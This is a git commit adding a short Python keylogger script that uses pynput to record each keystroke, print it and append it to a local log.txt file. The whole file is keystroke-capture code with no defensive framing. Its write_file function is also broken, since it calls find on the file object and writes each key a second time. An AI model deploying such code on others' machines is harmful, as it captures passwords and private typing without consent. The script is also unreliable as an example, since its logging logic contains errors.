3dda4917a7e68ab28f6db87126be8a49397bf728
Sukarayam Janjua <94704551+SukarayamJanjua@users.noreply.github.com>
2022-10-04 00:06:43 +0530

    commited algorithm for keylogger

---
+++ Keylogger/main.py
@@ -0,0 +1,34 @@
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count +=1
+    print("{0} pressed".format(key))
+
+    if count >= 10:
+        count =0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open("log.txt","a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write('\n')
+            elif f.find("Key") == -1:
+                f.write(k)
+            f.write(str(key))
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press,on_release=on_release) as listener:
+    listener.join()
